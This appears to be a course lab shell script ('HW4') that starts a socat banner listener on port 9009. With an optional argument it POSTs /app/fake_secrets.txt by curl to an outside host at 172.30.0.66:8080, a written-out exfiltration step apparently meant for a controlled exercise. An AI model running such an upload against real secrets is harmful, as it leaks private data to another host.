#!/bin/sh
set -eu

case "$#" in
  0) ;;
  1)
    if [ "$1" != "exfiltrate-course-file" ]; then
      echo "Usage: $0 [exfiltrate-course-file]" >&2
      exit 2
    fi
    ;;
  *)
    echo "Usage: $0 [exfiltrate-course-file]" >&2
    exit 2
    ;;
esac

PIDFILE=/tmp/hw4-listener.pid

if [ -f "$PIDFILE" ] &&
   kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
  echo "Banner listener already running on TCP 9009."
else
  nohup socat \
    TCP-LISTEN:9009,reuseaddr,fork \
    'EXEC:/bin/echo HW4 harmless banner' \
    </dev/null >/tmp/hw4-listener.log 2>&1 &

  listener_pid=$!
  echo "$listener_pid" > "$PIDFILE"
  sleep 0.2

  if ! kill -0 "$listener_pid" 2>/dev/null; then
    cat /tmp/hw4-listener.log >&2
    exit 1
  fi

  echo "Started banner listener on TCP 9009."
fi

if [ "${1:-}" = "exfiltrate-course-file" ]; then
  curl --noproxy '*' \
    --fail --silent --show-error \
    --connect-timeout 3 --max-time 5 \
    -H 'Content-Type: application/octet-stream' \
    --data-binary @/app/fake_secrets.txt \
    -o /dev/null \
    -w 'HTTP status: %{http_code}\n' \
    http://172.30.0.66:8080/
fi
